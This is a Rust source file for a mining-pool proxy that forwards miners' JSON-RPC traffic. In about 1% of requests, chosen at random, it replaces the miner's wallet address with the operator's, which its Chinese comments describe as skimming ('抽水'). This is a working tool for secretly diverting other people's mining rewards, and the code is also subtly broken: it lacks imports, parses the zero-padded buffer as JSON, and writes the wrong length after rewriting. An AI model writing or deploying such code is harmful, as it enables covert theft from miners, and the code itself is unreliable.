use tokio::io::{AsyncReadExt, AsyncWriteExt};
use rand::Rng;
use std::sync::Arc;

async fn handle_client(mut inbound: TcpStream, pool_address: Arc<String>, target_address: Arc<String>, fee_percentage: f64) -> Result<(), Box<dyn std::error::Error>> {
    let mut outbound = TcpStream::connect(&*pool_address).await?;
    let mut buffer = vec![0; 4096];

    loop {
        let n = inbound.read(&mut buffer).await?;

        if n == 0 {
            break;
        }

        // 抽水逻辑：决定是否将请求重定向到你的钱包
        if should_divert(fee_percentage) {
            modify_request(&mut buffer, &target_address);
        }

        outbound.write_all(&buffer[..n]).await?;

        let n = outbound.read(&mut buffer).await?;
        if n == 0 {
            break;
        }

        inbound.write_all(&buffer[..n]).await?;
    }

    Ok(())
}

fn should_divert(fee_percentage: f64) -> bool {
    rand::thread_rng().gen_bool(fee_percentage)
}

fn modify_request(buffer: &mut Vec<u8>, target_address: &str) {
    // 假设挖矿请求是 JSON-RPC 格式的，找到地址字段并替换为 target_address
    if let Ok(mut json) = serde_json::from_slice::<serde_json::Value>(buffer) {
        if let Some(params) = json["params"].as_array_mut() {
            if let Some(address) = params.get_mut(0) {
                *address = serde_json::Value::String(target_address.to_string());
            }
        }

        if let Ok(new_buffer) = serde_json::to_vec(&json) {
            buffer.clear();
            buffer.extend_from_slice(&new_buffer);
        }
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let listener = TcpListener::bind("0.0.0.0:3333").await?;
    let pool_address = Arc::new("real.pool.address:3333".to_string());
    let target_address = Arc::new("your.wallet.address".to_string());
    let fee_percentage = 0.01; // 1% 抽水

    loop {
        let (inbound, _) = listener.accept().await?;
        let pool_address = Arc::clone(&pool_address);
        let target_address = Arc::clone(&target_address);

        tokio::spawn(async move {
            if let Err(e) = handle_client(inbound, pool_address, target_address, fee_percentage).await {
                eprintln!("Error handling client: {:?}", e);
            }
        });
    }
}
